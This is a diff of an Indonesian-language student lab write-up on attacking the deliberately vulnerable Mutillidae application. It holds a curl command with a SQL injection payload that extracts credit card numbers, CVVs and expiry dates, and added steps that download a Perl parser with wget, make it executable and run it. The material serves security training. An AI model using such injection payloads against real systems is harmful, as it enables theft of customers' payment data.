@@ -162,6 +162,11 @@ Data pada username menyatakan nomor kartu kredit, password menyatakan password, 
 kemudian ketikan perintah berikut (curl -b crack_cookies.txt -c crack_cookies.txt --user-agent "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)" --data "page=user-info.php&username=%27+union+select+ccid%2Cccnumber%2Cccv%2Cexpiration%2Cnull+from+credit_cards+--+&password=&user-info-php-submit-button=View+Account+Details" --location "http://[IP_Address_mutillidae]/mutillidae/index.php" | grep -i "Username="  > lesson8.txt). Perlu menganti alamat ip agar sesuai. Kemudian ketikan perintah (cat lesson8.txt) untuk menampilkan. 
   ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/LESSON_8/3.4.png "cat the use of curl")
 
-18. Selanjutnya adalah mendownload output parser. Tujuannya adalah agar hasil crawl dapat dibaca dengan baik. pertama ketikan perintah (cd /root) untuk pindah ke dokumen root. kedua, ketikan perintah (wget http://www.computersecuritystudent.com/SECURITY_TOOLS/MUTILLIDAE/MUTILLIDAE_2511/lesson8/lesson8.pl.TXT) untuk mendownload parser dalam bahasa perl.
+18. Selanjutnya adalah mendownload output parser. Tujuannya adalah agar hasil crawl dapat dibaca dengan baik. Pertama ketikan perintah (cd /root) untuk pindah ke direktori root. kedua, ketikan perintah (wget http://www.computersecuritystudent.com/SECURITY_TOOLS/MUTILLIDAE/MUTILLIDAE_2511/lesson8/lesson8.pl.TXT) untuk mendownload parser dalam bahasa perl. Kemudian ketikan (mv lesson8.pl.TXT lesson8.pl) untuk mengubah eksistensi file menjadi (.pl). Lalu perintah (chmod 700 lesson8.pl) untuk memastikan hanya pemilik yang bisa menjalankan.
+  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/LESSON_8/3.5.png "download and prepare parser")
+
+19. Kemudian jalankan parser yang sudah didownload dengan perintah (./lesson8.pl) lalu enter
+hasilnya adalah 
+  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/LESSON_8/3.6.png "run the parser")
 
 
